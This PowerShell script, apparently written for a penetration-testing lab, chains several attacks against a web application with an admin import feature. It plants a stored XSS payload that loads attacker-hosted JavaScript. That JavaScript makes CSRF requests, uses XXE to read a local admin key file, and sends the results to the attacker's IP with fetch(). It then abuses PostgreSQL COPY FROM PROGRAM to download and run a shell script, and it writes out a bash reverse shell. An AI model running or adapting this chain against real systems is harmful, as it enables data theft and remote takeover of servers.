#[System.Web.HttpUtility]::UrlEncode('');
#[System.Web.HttpUtility]::UrlDecode('');
$attacker_ip = '192.168.119.169';
$target_ip = '192.168.169.251';
$javascript = @"
const attacker_ip = '$attacker_ip';
const host_ip = '$target_ip';
// Import Data into the database
let xmldata = ``
<!DOCTYPE data [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt" >
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://`${attacker_ip}/wrapper.dtd" >
  %dtd;
  ]>
  <database><categories><category><name>&wrapper;</name></category></categories></database>
``;
config = {
  "method":"POST",
  "credentials":"include",
  mode: "cors",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  }, 
  body:  "preview=true&xmldata="+ encodeURIComponent(xmldata)
};
let query = ``CREATE TABLE IF NOT EXISTS cucked(cmd_output text);COPY cucked FROM PROGRAM 'wget http://`${attacker_ip}/shell.sh -O /tmp/shell.sh;bash /tmp/shell.sh';DROP TABLE IF EXISTS cucked;select version();``

runQuery(``http://`${host_ip}/admin/import``, config, query);

// Helper Functions
// very basic
function doRequest(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
        mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(``http://`${attacker_ip}/?exfil=`` + data.length, {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(``http://`${attacker_ip}/?error=`` + error, {
        mode: "cors",
      });   
  });
}
// applies uri encoding to exfiltrated data
function doRequest1(endpoint, cfg) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
        mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(``http://`${attacker_ip}/?exfil=`` + encodeURIComponent(data), {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(``http://`${attacker_ip}/?error=`` + error, {
        mode: "cors",
      });   
  });
}
// applied uri encoding and a regex to the exfiltrated data
function doRequest2(endpoint, cfg, regex) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
        mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      var exfil = data.match(regex)[0];
      fetch(``http://`${attacker_ip}/?exfil=`` + encodeURIComponent(exfil), {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(``http://`${attacker_ip}/?error=`` + error, {
        mode: "cors",
      });   
  });
}


function runQuery(endpoint, cfg, query) {
  fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
        mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      const re = /<!\[CDATA\[.*\s\]\]>/
      var key = data.match(re)[0];
      key = key.replace(/<!\[CDATA\[/,'');
      key = key.replace(/\s]]>/,'');
      fetch(``http://`${attacker_ip}/?exfil=`` + encodeURIComponent(key), {
        mode: "cors",
      });
      let cfg_n = {
        "method":"POST",
        "credentials":"include",
        mode: "cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        }, 
        body: ``adminKey=`${key}&query=`${query}``
      }
      // trigger key creation
      //doRequest1(``http://`${host_ip}/admin/query``, cfg_n);
      // execute a query
      doRequest2(``http://`${host_ip}/admin/query``, cfg_n, /<pre>.*\s\S.*\s\S\/pre>/);
    }
  }).catch((error) => {
       fetch(``http://`${attacker_ip}/?error=`` + error, {
        mode: "cors",
      });   
  });
}
"@;
$csrf_payload = New-Item -ItemType File -Path "cucked.js" -Value $javascript -Force;
$xxe_payload = New-Item -ItemType File -Path "wrapper.dtd" -Value '<!ENTITY wrapper "%start;%file;%end;">' -Force;
$xss_payload = "`"><script src='http://$attacker_ip/$($csrf_payload.name)'></script>";
$reverse_shell = New-Item -ItemType File -Path 'shell.sh' -Value '/bin/bash -i >& /dev/tcp/192.168.119.169/4444 0>&1' -Force;
Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1";

Write-Output "Sleeping for 30 seconds, start simulation";
Start-Sleep -Seconds 30;

Remove-Item -Path $csrf_payload.Name;
Remove-Item -Path $xxe_payload.Name;
Remove-Item -Path $reverse_shell.Name;

# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution